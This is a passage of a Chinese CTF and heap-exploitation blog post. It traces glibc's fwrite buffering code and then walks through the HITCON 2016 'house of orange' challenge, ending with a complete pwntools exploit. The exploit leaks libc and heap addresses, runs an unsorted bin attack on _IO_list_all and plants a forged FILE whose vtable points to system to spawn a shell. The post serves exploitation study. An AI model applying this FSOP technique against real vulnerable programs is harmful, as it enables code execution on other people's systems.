   fp->_IO_write_end = (fp->_mode <= 0
            && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
            ? fp->_IO_buf_base : fp->_IO_buf_end);
   return count;
 }
 ```

​    这里有一个判断，判断fp->_IO_read_end是否等于fp->_IO_write_base，如果不等的话，调用_IO_SYSSEEK去调整文件偏移。

​    接着就调用_IO_SYSWRITE函数，该函数时vtable中的__write(_IO_new_file_write)函数，也就是最终执行系统调用的地方，跟进去看，文件在/libio/fileops.c中。

 ```c
 _IO_ssize_t
 _IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
 {
   _IO_ssize_t to_do = n;
   while (to_do > 0)
     {
     # 系统调用write输出
       _IO_ssize_t count = (__builtin_expect (f->_flags2
                & _IO_FLAGS2_NOTCANCEL, 0)
          ? write_not_cancel (f->_fileno, data, to_do)
          : write (f->_fileno, data, to_do));
   ...   
   return n;
 }
 ```

​    执行完_IO_SYSWRITE函数后，回到new_do_write函数，刷新设置缓冲区指针并返回。

​    经历了缓冲区建立以及刷新缓冲区，程序返回到_IO_new_file_xsputn函数中，进入到以下代码块。

 ```c
   # 检查输出数据是否是大块
       block_size = f->_IO_buf_end - f->_IO_buf_base;
       do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
 
 
       if (do_write)
   {
     # 如果是大块的话则不使用输出缓冲区而直接输出。
     count = new_do_write (f, s, do_write);
     to_do -= count;
     if (count < do_write)
       return n - to_do;
   }
 ```

​    运行到此处，此时已经经过了_IO_OVERFLOW函数（对输出缓冲区进行了初始化或刷新），也就是说此时的IO_FILE缓冲区指针的状态是处于刷新的初始化状态，输出缓冲区中也没用数据。

​    上面这部分代码检查剩余目标输出数据大小，如果超过输出缓冲区f->_IO_write_end – f->_IO_write_base的大小，则为了提高效率，不在使用输出缓冲区，而是以块（4kb）为基本单位直接将缓冲区调用new_do_write输出。new_do_write函数在上面已经跟过了，就是输出，并刷新指针设置。

​    由于示例程序只输出0x20大小的数据，而它的输出缓冲区大小为0x1000，因此不会进入这部分代码。

​    在以大块为基本单位把数据直接输出后可能还剩余小数据，IO采用的策略是将剩余目标输出数据放入到输出缓冲区里面，相关源码如下。

 ```c
  # 剩余的数据拷贝至输出缓冲区
       if (to_do)
   to_do -= _IO_default_xsputn (f, s+do_write, to_do);
 ```

​    程序调用_IO_default_xsputn函数对剩下的s + do_write数据进行操作，跟进去该函数，在/libio/genops.c中。

 ```c
 _IO_size_t
 _IO_default_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
 {
   const char *s = (char *) data;
   _IO_size_t more = n;
   if (more <= 0)
     return 0;
   for (;;)
     {
       /* Space available. */
       if (f->_IO_write_ptr < f->_IO_write_end)
   {
     _IO_size_t count = f->_IO_write_end - f->_IO_write_ptr;
     if (count > more)
       count = more;
     if (count > 20)
       {
         # 输出长度大于20，则调用memcpy拷贝
         memcpy (f->_IO_write_ptr, s, count);
         f->_IO_write_ptr += count;
 #endif
         s += count;
       }
     else if (count)
       {
         # 小于20则直接赋值
         char *p = f->_IO_write_ptr;
         _IO_ssize_t i;
         for (i = count; --i >= 0; )
     *p++ = *s++;
         f->_IO_write_ptr = p;
       }
     more -= count;
   }
   # 如果输出缓冲区为空，则调用_IO_OVERFLOW直接输出。
       if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)
   break;
       more--;
     }
   return n - more;
 }
 libc_hidden_def (_IO_default_xsputn)
 ```

​    可以看到函数最主要的作用就是将剩余的目标输出数据拷贝到输出缓冲区里。为了性能优化，当长度大于20时，使用memcpy拷贝，当长度小于20时，使用for循环赋值拷贝。如果输出缓冲区为空，则调用_IO_OVERFLOW进行输出。

​    根据源码可知，示例程序最终会进入_IO_default_xsputn中，并且把数据拷贝到输出缓冲区里，执行完成后，看到IO_FILE结构体的数据如下。

 ![image-20211226165152025](/images/heap/image-20211226165152025.png)

​    可以看到此时的_IO_write_base为0x602270，而_IO_write_ptr为0x602290，大小正好是0x20。至此，源码分析结束。

## [house of orange](https://files.buuoj.cn/files/0bb7a5f7f7e032c913ba3c373e7cf88e/houseoforange_hitcon_2016?token=eyJ1c2VyX2lkIjo4ODY0LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyOTh9.YNHWEQ.yi3I-oRWIrGXpwwQlb5mSz121MM)

### 前置知识   

​    FSOP: File Stream Oriented Programming

​    当malloc_printer时有以下调用关系

 ```c
 __libc_malloc => malloc_printerr => __libc_message => abort => _IO_flush_all_lockp
 ```

```c
/* Flush all streams.  We cannot close them now because the user
   might have registered a handler for SIGABRT.  */
if (stage == 1)
  {
    ++stage;
    fflush (NULL); //abort中刷新了stream
  }
```

```c
#include <libio/libioP.h>
#define fflush(s) _IO_flush_all_lockp (0)

_IO_flush_all_lockp -> JUMP_FILE(_IO_OVERFLOW)
```

 House of orange的原理就是调用malloc时，利用unsorted bin中错误的fd/bk指针，触发malloc_printer函数打印错误信息，malloc_printer调用__libc_message，__libc_message调用abort()，abort()调用_IO_flush_all_lockp。_

在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中每个节点进行遍历，找到符合条件的节点，执行_IO_OVERWRITE函数，其中特点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。如果我们可以劫持IO表中的_IO_OVERFLOW就可以getshell。

### 程序分析

checksec查看程序保护。

 ![image-20211226165525072](/images/heap/image-20211226165525072.png)

​     漏洞点在于一开始申请堆块时候是按照输入的size做malloc，而edit的时候也输入的新的size但没有验证合法性，造成堆溢出。

 ![image-20211226165554877](/images/heap/image-20211226165554877.png)

​    其他函数都没啥问题，而且打印堆块内容的函数，泄露libc困难。

### 调试过程

​     要完成利用的第一步通常就是泄露libc基址，这里可以通过堆溢出修改top chunk的size，让其进入unsorted bin中，然后切割泄露libc基址。但是需要注意的是：

1. 伪造的size必须要对齐到内存页

2. Size要大于MINSIZE(0x10)

3. Size要小于之后申请的chunk size + MINSIZE(0x10)

4. Size的prev_inuse位必须为1

 ```python
 add(0x10, 'verf1sh', 0x10, 1)
 edit(0x40, 'a'*0x18+p64(0x21)+p32(0x10)+p32(0x1f)+p64(0)*2+p64(0xfa1), 0x10, 1) # 通过溢出修改top chunk的size为0xfa1
 add(0x1000, 'verf1sh', 0x10, 1) # 申请一个大于此时topchunk的size，使top chunk掉入unsortbin
 ```

​    执行完add(0x10, 'verf1sh', 0x10, 1)，已经有三个堆块了。

 ![image-20211226165643619](/images/heap/image-20211226165643619.png)

​    这时，通过编辑堆块功能处的堆溢出漏洞将top chunk的size改小。

 ![image-20211226165650056](/images/heap/image-20211226165650056.png)

 ![image-20211226165655434](/images/heap/image-20211226165655434.png)

​    这时候再通过add(0x1000, 'verf1sh', 0x10, 1)申请一个大小大于top chunk的堆块，堆管理器就会使用brk拓展堆，并将原来的top chunk释放到unsorted bin中。这样我们就构造处了一个处于unsorted bin的堆块。

 ![image-20211226165700782](/images/heap/image-20211226165700782.png)

​    再add一次大chunk，就会从unsorted bin里切割，可以show出libc的地址。同时，如果这个chunk是large chunk，在fd_nextsize和bd_nextsize中还会存储堆的地址，由此就可以完成信息泄露。

 ```python
 # leak libc_base
 add(0x400, 'a'*8, 0x10, 1)
 show()
 p.recvuntil('a'*8)
 libc_base = u64(p.recv(6).ljust(8, '\x00')) - 1640 - 0x10 - libc.sym['__malloc_hook']
 success('libc_base -> {}'.format(hex(libc_base)))
 _IO_list_all = libc_base + libc.sym['_IO_list_all']
 system = libc_base + libc.sym['system']
 
 # leak heap_base
 edit(0x10, 'a'*0x10, 0x10, 1)
 show()
 p.recvuntil('a'*0x10)
 heap_base = u64(p.recv(6).ljust(8, '\x00')) & 0xfffffffff000
 success('heap_base -> {}'.format(hex(heap_base)))
 ```

​    执行完add(0x400, 'a'*8, 0x10, 1)，获取到的chunk如下图所示。

 ![image-20211226165723713](/images/heap/image-20211226165723713.png)接下来就是涉及IO_FILE的利用了，就是前置知识中讲提及的FSOP（File Stream Oriented Programming)。关于IO_FILE的概念在前面讲解fopen、fread和fwrite的时候已经介绍过了，这里再复习一下。

​    每个FILE结构体都通过一个_IO_FILE_plus结构体定义。

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

​    其中包括一个IO_FILE结构体和一个vtable虚表指针。

​    根据house of orange的流程，下面就是利用unsorted bin attack来修改_IO_list_all指针的值。unsorted bin attack在上次实验中已经介绍过了，简单来说就是在malloc的过程中，unsorted bin会从链表上卸下来，将其中最后一个chunk取出，并把倒数第二个chunk的fd设置为unsortedbin_chunk(av)的地址其实就是(&main_arena+88)，而此时我们将unsorted bin中的chunk的bk改成_IO_list_all-0x10，这样从unsorted bin中取出它时，就可以成功将_IO_list_all改写为&main_arena+88了。

​    前面说过在malloc出错时会调用malloc_printer函数来输出错误信息，其最终调用的函数其实就是vtable中的_IO_OVERFLOW函数。所以如果可以控制_IO_list_all 的值，同时伪造一个IO_FILE和vtable并放入FILE链表中，就可以让malloc_printer打印错误信息时进入我们伪造vtable，将_IO_OVERFLOW函数篡改为system，那么就会调用system函数了。

​    但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍。

 ![image-20211226165745670](/images/heap/image-20211226165745670.png)

​    观察代码发现，_IO_OVERFLOW存在于if之中，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：

```c
fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
```

或者

```c
_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr> fp->_wide_data->_IO_write_base)
```

​    以上条件至少要满足一个，这里我们选择第一个，只需构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。

​    在前面介绍的unsortedbin attack可以将_IO_list_all指针的值修改为&main_arena+88。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。

   所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp->_chain不断的寻找下一个_IO_FILE。

 ![image-20211226165822872](/images/heap/image-20211226165822872.png)

​    所以如果可以修改fp->_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。

​    巧妙的是，_IO_FILE结构中的chain字段对应偏移是0x68，而在&main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。

​    如果通过溢出，将位于unsorted bin中的chunk的size修改为0x61。那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中。

​    因此，我们将位于unsorted bin中的chunk的size修改为0x61，因此该chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。

​    这样，当_IO_flush_all_lockp函数通过fp->_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。

   这样，当_IO_flush_all_lockp函数通过fp->_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。

 ![image-20211226165831107](/images/heap/image-20211226165831107.png)

​    而这时就到了我们伪造的_IO_FILE处，我们已经把伪造的IO_FILE结构体的vtable表中偏移为3出的__overflow函数已经被篡改为system了。

 ![image-20211226165837432](/images/heap/image-20211226165837432.png)

​    这些unsorted bin attack和FSOP的操作都是在最后执行malloc(0x10)的时候完成的。

​    至此整个调试过程分析完毕。

### 完整exp

 ```python
 from pwn import *
 
 context.log_level = 'debug'
 binary = './houseoforange_hitcon_2016'
 elf = ELF(binary)
 libc = elf.libc
 local = 1
 if local:
  p = process(binary)
 else:
  p = remote('')
 
 def add(length, name, price, color):
  p.sendlineafter(': ', '1')
  p.sendlineafter(':', str(length))
  p.sendafter(':', name)
  p.sendlineafter(':', str(price))
  p.sendlineafter(':', str(color))
 
 def show():
  p.sendlineafter(': ', '2')
 
 def edit(length, name, price, color):
  p.sendlineafter(': ', '3')
  p.sendlineafter(':', str(length))
  p.sendafter(':', name)
  p.sendlineafter(':', str(price))
  p.sendlineafter(':', str(color))
 
 #gdb.attach(p)
 
 
 add(0x10, 'verf1sh', 0x10, 1)
 
 edit(0x40, 'a'*0x18+p64(0x21)+p32(0x10)+p32(0x1f)+p64(0)*2+p64(0xfa1), 0x10, 1)
 add(0x1000, 'verf1sh', 0x10, 1)
 
 # leak libc_base
 add(0x400, 'a'*8, 0x10, 1)
 show()
 p.recvuntil('a'*8)
 libc_base = u64(p.recv(6).ljust(8, '\x00')) - 1640 - 0x10 - libc.sym['__malloc_hook']
 success('libc_base -> {}'.format(hex(libc_base)))
 _IO_list_all = libc_base + libc.sym['_IO_list_all']
 system = libc_base + libc.sym['system']
 
 # leak heap_base
 edit(0x10, 'a'*0x10, 0x10, 1)
 show()
 p.recvuntil('a'*0x10)
 heap_base = u64(p.recv(6).ljust(8, '\x00')) & 0xfffffffff000
 success('heap_base -> {}'.format(hex(heap_base)))
 # pause()
 
 # fsop
 payload = 'a'*0x400 + p64(0) + p64(0x21) + p32(0x10) + p32(0x1f) + p64(0)
 fake_file = '/bin/sh\x00' + p64(0x61)
 fake_file += p64(0) + p64(_IO_list_all - 0x10)
 fake_file += p64(0) + p64(1) #_IO_write_base < _IO_write_ptr
 fake_file = fake_file.ljust(0xc0,'\x00')
 fake_file += p64(0) * 3
 fake_file += p64(heap_base+0x5c8) #vtable ptr
 fake_file += p64(0) * 2
 fake_file += p64(system)
 payload += fake_file
 edit(len(payload), payload, 16, 1)
 # pause()
 p.sendlineafter(': ', '1')
 
 p.interactive()
 ```

## 参考链接

https://www.anquanke.com/post/id/177910

https://www.anquanke.com/post/id/177958

https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis

https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop

https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/

https://fl0ey.icu/2020/10/15/house_of_orange/

https://zhuanlan.zhihu.com/p/65873040